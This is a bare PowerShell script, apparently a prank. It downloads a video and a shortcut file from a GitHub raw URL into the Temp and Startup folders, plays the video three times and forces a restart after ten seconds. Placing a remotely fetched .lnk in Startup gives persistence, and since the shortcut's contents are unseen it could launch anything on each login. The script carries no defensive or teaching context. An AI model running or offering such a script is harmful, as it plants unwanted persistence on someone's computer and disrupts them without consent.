$sigma_source = "https://raw.githubusercontent.com/toomuchspaghetti/Test/master/sigma.mp4"
$important_source = "https://raw.githubusercontent.com/toomuchspaghetti/Test/master/Important.lnk"
$sigma_file = "C:\Windows\Temp\skibidi.mp4"
$important_file = -join([Environment]::GetFolderPath('Startup'), "/Important.lnk")

(new-object System.Net.WebClient).DownloadFile($sigma_source, $sigma_file)
(new-object System.Net.WebClient).DownloadFile($important_source, $important_file)

start $sigma_file
start $sigma_file
start $sigma_file

shutdown /r /t 10